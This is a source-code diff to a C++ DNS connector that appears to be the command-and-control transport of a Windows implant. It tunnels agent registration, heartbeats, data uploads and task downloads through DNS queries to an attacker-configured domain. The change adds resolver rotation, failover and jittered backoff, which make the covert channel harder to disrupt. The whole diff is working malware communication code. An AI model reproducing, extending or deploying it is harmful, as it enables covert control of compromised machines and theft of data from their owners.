@@ -63,7 +63,8 @@ static void MetaV1Init(DNS_META_V1* h)
 	h->downAckOffset = 0;
 }
 
-static BOOL DnsQueryTxt(const CHAR* qname, const CHAR* resolverRaw, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
+// Single-resolver DNS query (no rotation logic, caller handles rotation)
+static BOOL DnsQuerySingle(const CHAR* qname, const CHAR* resolverIP, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
 {
 	*outSize = 0;
 	if (!ApiWin || !ApiWin->WSAStartup || !ApiWin->socket || !ApiWin->sendto || !ApiWin->recvfrom || !ApiWin->closesocket)
@@ -79,11 +80,8 @@ static BOOL DnsQueryTxt(const CHAR* qname, const CHAR* resolverRaw, const CHAR* 
 		return FALSE;
 	}
 
-	// 解析 resolver，支持从 profile.resolvers 传入的 IPv4 文本，
-	// 若为空则回退到默认 1.1.1.1。
-	CHAR resolver[64];
-	memset(resolver, 0, sizeof(resolver));
-	SelectResolver(resolverRaw, resolver, sizeof(resolver));
+	// Use provided resolver IP directly (no parsing needed)
+	const CHAR* resolver = (resolverIP && resolverIP[0]) ? resolverIP : "1.1.1.1";
 
 	HOSTENT* he = ApiWin->gethostbyname(resolver);
 	if (!he || !he->h_addr_list || !he->h_addr_list[0]) {
@@ -144,42 +142,45 @@ static BOOL DnsQueryTxt(const CHAR* qname, const CHAR* resolverRaw, const CHAR* 
 	BYTE resp[1024];
 	memset(resp, 0, sizeof(resp));
 	int recvLen = 0;
-	const int maxRetries = 3;
-	for (int attempt = 0; attempt < maxRetries; ++attempt) {
-		// Log readable QNAME (domain format)
-		DnsDebugLogf("[TX] QNAME: %s", qname);
-		
-		int sent = ApiWin->sendto(s, (const char*)query, offset, 0, (sockaddr*)&addr, sizeof(addr));
-		if (sent != offset) {
-			DnsDebugLogf("[DNS] sendto failed: sent=%d expected=%d", sent, offset);
-			ApiWin->closesocket(s);
-			ApiWin->WSACleanup();
-			return FALSE;
-		}
+	// Single attempt per resolver - rotation handles failover, no internal retry needed
+	// This speeds up failover detection significantly
+	
+	// Log readable QNAME (domain format)
+	DnsDebugLogf("[TX] QNAME: %s -> %s", qname, resolver);
+	
+	int sent = ApiWin->sendto(s, (const char*)query, offset, 0, (sockaddr*)&addr, sizeof(addr));
+	if (sent != offset) {
+		DnsDebugLogf("[DNS] sendto failed: sent=%d expected=%d", sent, offset);
+		ApiWin->closesocket(s);
+		ApiWin->WSACleanup();
+		return FALSE;
+	}
 
-		fd_set readfds;
-		readfds.fd_count = 1;
-		readfds.fd_array[0] = s;
-		timeval timeout;
-		timeout.tv_sec = 2;
-		timeout.tv_usec = 0;
+	fd_set readfds;
+	readfds.fd_count = 1;
+	readfds.fd_array[0] = s;
+	timeval timeout;
+	timeout.tv_sec = 3;  // 3 second timeout per resolver
+	timeout.tv_usec = 0;
 
-		int selResult = ApiWin->select(0, &readfds, NULL, NULL, &timeout);
-		if (selResult == 0) {
-			DnsDebugLogf("[DNS] timeout attempt=%d", attempt);
-			continue;
-		}
-		if (selResult == SOCKET_ERROR) {
-			DnsDebugLog("[DNS] select error");
-			break;
-		}
+	int selResult = ApiWin->select(0, &readfds, NULL, NULL, &timeout);
+	if (selResult == 0) {
+		DnsDebugLogf("[DNS] timeout resolver=%s", resolver);
+		ApiWin->closesocket(s);
+		ApiWin->WSACleanup();
+		return FALSE;
+	}
+	if (selResult == SOCKET_ERROR) {
+		DnsDebugLog("[DNS] select error");
+		ApiWin->closesocket(s);
+		ApiWin->WSACleanup();
+		return FALSE;
+	}
 
-		int addrLen = sizeof(addr);
-		recvLen = ApiWin->recvfrom(s, (char*)resp, sizeof(resp), 0, (sockaddr*)&addr, &addrLen);
-		if (recvLen > 0) {
-			DnsDebugLogf("[RX] len=%d", recvLen);
-			break;
-		}
+	int addrLen = sizeof(addr);
+	recvLen = ApiWin->recvfrom(s, (char*)resp, sizeof(resp), 0, (sockaddr*)&addr, &addrLen);
+	if (recvLen > 0) {
+		DnsDebugLogf("[RX] len=%d", recvLen);
 	}
 
 	ApiWin->closesocket(s);
@@ -298,6 +299,41 @@ BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize)
     // cache profile
     this->profile = profile;
 
+    // Parse resolver list (comma/semicolon separated)
+    this->resolverCount = 0;
+    ZeroMemory(this->rawResolvers, sizeof(this->rawResolvers));
+    for (ULONG i = 0; i < 16; ++i) {
+        this->resolverList[i] = NULL;
+        this->resolverFailCount[i] = 0;
+        this->resolverDisabledUntil[i] = 0;
+    }
+
+    if (profile.resolvers && profile.resolvers[0]) {
+        lstrcpynA(this->rawResolvers, (CHAR*)profile.resolvers, sizeof(this->rawResolvers));
+        CHAR* p = this->rawResolvers;
+        while (*p && this->resolverCount < 16) {
+            // Skip leading whitespace and separators
+            while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' || *p == '\r' || *p == '\n') ++p;
+            if (!*p) break;
+            this->resolverList[this->resolverCount++] = p;
+            // Find end of this resolver
+            while (*p && *p != ',' && *p != ';' && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') ++p;
+            if (*p) *p++ = '\0';
+        }
+    }
+
+    // Default resolver if none specified
+    if (this->resolverCount == 0) {
+        lstrcpynA(this->rawResolvers, "1.1.1.1", sizeof(this->rawResolvers));
+        this->resolverList[0] = this->rawResolvers;
+        this->resolverCount = 1;
+    }
+
+    DnsDebugLogf("[DNS] SetConfig: resolverCount=%lu", this->resolverCount);
+    for (ULONG i = 0; i < this->resolverCount; ++i) {
+        DnsDebugLogf("[DNS]   resolver[%lu]=%s", i, this->resolverList[i]);
+    }
+
     // copy encrypt key (fixed 16 bytes binary, NOT null-terminated string)
     if (!profile.encrypt_key)
         return FALSE;
@@ -399,6 +435,89 @@ void ConnectorDNS::CloseConnector()
 void ConnectorDNS::UpdateResolvers(BYTE* resolvers)
 {
 	this->profile.resolvers = resolvers;
+
+	// Re-parse resolver list
+	this->resolverCount = 0;
+	ZeroMemory(this->rawResolvers, sizeof(this->rawResolvers));
+	for (ULONG i = 0; i < 16; ++i) {
+		this->resolverList[i] = NULL;
+		this->resolverFailCount[i] = 0;
+		this->resolverDisabledUntil[i] = 0;
+	}
+
+	if (resolvers && resolvers[0]) {
+		lstrcpynA(this->rawResolvers, (CHAR*)resolvers, sizeof(this->rawResolvers));
+		CHAR* p = this->rawResolvers;
+		while (*p && this->resolverCount < 16) {
+			while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' || *p == '\r' || *p == '\n') ++p;
+			if (!*p) break;
+			this->resolverList[this->resolverCount++] = p;
+			while (*p && *p != ',' && *p != ';' && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') ++p;
+			if (*p) *p++ = '\0';
+		}
+	}
+
+	if (this->resolverCount == 0) {
+		lstrcpynA(this->rawResolvers, "1.1.1.1", sizeof(this->rawResolvers));
+		this->resolverList[0] = this->rawResolvers;
+		this->resolverCount = 1;
+	}
+
+	DnsDebugLogf("[DNS] UpdateResolvers: resolverCount=%lu", this->resolverCount);
+}
+
+BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
+{
+	*outSize = 0;
+
+	if (this->resolverCount == 0) {
+		DnsDebugLog("[DNS] QueryWithRotation: no resolvers configured");
+		return FALSE;
+	}
+
+	// Try each resolver in rotation order
+	for (ULONG i = 0; i < this->resolverCount; ++i) {
+		ULONG idx = (this->currentResolverIndex + i) % this->resolverCount;
+		CHAR* resolver = this->resolverList[idx];
+		if (!resolver || !*resolver) continue;
+
+		// Skip disabled resolvers (failure backoff)
+		ULONG nowTick = GetTickCount();
+		if (this->resolverDisabledUntil[idx] && nowTick < this->resolverDisabledUntil[idx]) {
+			DnsDebugLogf("[DNS] Resolver[%lu] %s: disabled until %lu (now=%lu)", idx, resolver, this->resolverDisabledUntil[idx], nowTick);
+			continue;
+		}
+
+		DnsDebugLogf("[DNS] QueryWithRotation: trying resolver[%lu]=%s", idx, resolver);
+
+		if (DnsQuerySingle(qname, resolver, qtypeStr, outBuf, outBufSize, outSize)) {
+			// Success - update current index and reset fail count
+			this->currentResolverIndex = idx;
+			this->resolverFailCount[idx] = 0;
+			this->resolverDisabledUntil[idx] = 0;
+			DnsDebugLogf("[DNS] QueryWithRotation: SUCCESS via resolver[%lu]=%s", idx, resolver);
+			return TRUE;
+		}
+
+		// Failure - increment fail count
+		this->resolverFailCount[idx]++;
+		DnsDebugLogf("[DNS] QueryWithRotation: FAILED resolver[%lu]=%s failCount=%lu", idx, resolver, this->resolverFailCount[idx]);
+
+		// After 2 consecutive failures, disable this resolver temporarily
+		// Lower threshold since we removed internal retries from DnsQuerySingle
+		const ULONG maxFail = 2;
+		if (this->resolverFailCount[idx] >= maxFail) {
+			ULONG backoff = 30000; // 30 seconds (shorter, allow faster recovery)
+			ULONG jitter = GetTickCount() & 0x0FFF; // 0-4095ms jitter
+			this->resolverDisabledUntil[idx] = GetTickCount() + backoff + jitter;
+			this->resolverFailCount[idx] = 0;
+			DnsDebugLogf("[DNS] Resolver[%lu] %s: disabled for %lu ms", idx, resolver, backoff + jitter);
+		}
+	}
+
+	// All resolvers failed
+	DnsDebugLog("[DNS] QueryWithRotation: ALL resolvers failed");
+	return FALSE;
 }
 
 void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
@@ -443,7 +562,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         DnsBuildQName(this->sid, "www", hiWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
         BYTE tmp[512];
         ULONG tmpSize = 0;
-        this->lastQueryOk = DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
+        this->lastQueryOk = this->QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize);
         if (this->lastQueryOk) {
             this->hiSent = TRUE;
             DnsDebugLog("[DNS] HI: SUCCESS - agent registered");
@@ -534,7 +653,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                     DnsDebugLogf("[DNS] [UP] PUT retry=%d off=%lu", retry, offset);
                     ApiWin->Sleep(100 + (GetTickCount() % 50));  // Backoff before retry
                 }
-                putOk = DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
+                putOk = this->QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize);
             }
             
             if (!putOk) {
@@ -585,7 +704,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             DnsBuildQName(this->sid, "hb", ++this->seq, this->idx, ackLabel, this->domain, ackQname, sizeof(ackQname));
             BYTE tmp[16];
             ULONG tmpSize = 0;
-            DnsQueryTxt(ackQname, (CHAR*)this->profile.resolvers, "A", tmp, sizeof(tmp), &tmpSize);
+            this->QueryWithRotation(ackQname, "A", tmp, sizeof(tmp), &tmpSize);
             DnsDebugLogf("[DNS] [UP] ACK sid=%s ack=%lu nonce=%08x taskNonce=%08lx", 
                          this->sid, this->downAckOffset, ackNonce, this->downTaskNonce);
             // NOTE: Do NOT reset downAckOffset here! Keep it so subsequent HB requests
@@ -615,7 +734,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         DnsBuildQName(this->sid, "www", hiRetryWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
         BYTE tmp[512];
         ULONG tmpSize = 0;
-        if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
+        if (this->QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
             this->hiSent = TRUE;
             this->lastQueryOk = TRUE;
         } else {
@@ -669,7 +788,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         BYTE ipBuf[16];
         ULONG ipSize = 0;
         // 查询 A 记录
-        if (DnsQueryTxt(qnameA, (CHAR*)this->profile.resolvers, "A", ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
+        if (this->QueryWithRotation(qnameA, "A", ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
             this->lastQueryOk = TRUE;
             // 检查是否为 0.0.0.0
             if (ipBuf[0] == 0 && ipBuf[1] == 0 && ipBuf[2] == 0 && ipBuf[3] == 0) {
@@ -722,7 +841,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     DnsDebugLogf("[DNS] [DOWN-REQ] sid=%s seq=%lu off=%lu nonce=%08x", this->sid, logicalSeq, reqOffset, nonce);
     BYTE respBuf[1024];
     ULONG respSize = 0;
-    if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
+    if (this->QueryWithRotation(qname, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
         this->lastQueryOk = TRUE;
         DnsDebugLogf("[DNS] [DOWN-RSP] sid=%s raw_len=%lu", this->sid, respSize);
         // Check for simple ACK "OK"
@@ -961,7 +1080,7 @@ BOOL ConnectorDNS::IsBusy() const
     // 只有当状态发生变化或确实繁忙时才打印，避免刷屏
     // 但为了调试那个该死的 10s 延迟，我们暂时允许它打印
     if (busy) {
-        // DnsDebugLogf("[DNS] IsBusy=TRUE (downBuf=%p pending=%d)", this->downBuf, this->hasPendingTasks);
+        DnsDebugLogf("[DNS] IsBusy=TRUE (downBuf=%p pending=%d)", this->downBuf, this->hasPendingTasks);
     }
     return busy;
 }
